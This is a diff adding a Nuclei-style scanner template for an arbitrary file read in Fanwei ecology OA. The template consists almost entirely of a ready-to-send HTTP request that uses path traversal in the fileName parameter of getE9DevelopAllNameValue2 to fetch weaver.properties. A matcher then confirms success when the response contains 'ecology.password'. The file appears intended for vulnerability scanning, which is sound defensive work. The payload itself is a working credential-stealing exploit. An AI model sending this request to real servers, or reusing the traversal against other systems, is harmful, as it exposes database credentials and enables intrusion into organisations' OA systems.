@@ -1,0 +1,23 @@
+id: fanwei-ecology-gete9developallnamevalue2-fileread
+
+info:
+  name: 泛微OA ecology getE9DevelopAllNameValue2任意文件读取
+  author: pphua,nobody
+  severity: high
+  tags: ecology,fileread,fanwei,oa
+
+http:
+  - raw:
+      - |
+        GET /api/portalTsLogin/utils/getE9DevelopAllNameValue2?fileName=portaldev_/../weaver.properties HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8
+        Connection: close
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(body,'ecology.password') && status_code == 200"
